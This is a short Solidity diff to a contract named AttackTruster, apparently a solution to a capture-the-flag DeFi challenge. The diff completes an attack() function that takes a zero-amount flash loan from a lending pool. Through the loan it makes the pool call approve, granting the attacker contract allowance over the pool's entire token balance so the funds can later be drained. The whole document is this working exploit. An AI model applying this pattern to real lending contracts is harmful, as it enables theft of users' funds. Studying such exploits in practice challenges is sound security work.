@@ -17,8 +17,14 @@ contract AttackTruster {
 
     function attack() external {
         require(
-            poolflashLoan
-            ()
-        )
+            pool.flashLoan(
+                0,
+                address(this),
+                address(token),
+                abi.encodeWithSignature("approve(address,uint256)", address(this), token.balanceOf(address(pool)))
+            )
+        );
+
+
     }
 }
